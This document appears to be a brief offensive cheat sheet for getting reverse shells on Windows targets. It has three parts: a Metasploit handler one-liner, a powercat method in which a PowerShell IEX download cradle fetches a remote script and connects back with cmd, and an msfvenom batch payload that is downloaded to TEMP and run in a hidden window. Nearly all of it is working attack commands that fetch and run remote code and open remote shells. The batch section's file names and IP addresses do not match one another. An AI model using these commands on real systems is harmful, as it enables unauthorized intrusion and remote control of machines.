
common metasploit listener:
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT <PORT>; set ExitOnSession false; exploit -j"
```




using powercat:
```bash
attacker machine:

where powercat installed:
python3 -m http.server 9090

start netcat listener:
nc -nvlp 1234


target machine:
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.120:9090/powercat.ps1');powercat -c 192.168.1.120 -p 1234 -e cmd"
```


using batch file
```bash
attacker machine:

msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
python3 -m http.server 9090
nc -nvlp 4444

target system:
Invoke-WebRequest -Uri "http://192.168.1.120:9090/shell.bat" -OutFile "$env:TEMP\shell.bat"; Start-Process "$env:TEMP\shell.bat" -WindowStyle Hidden

```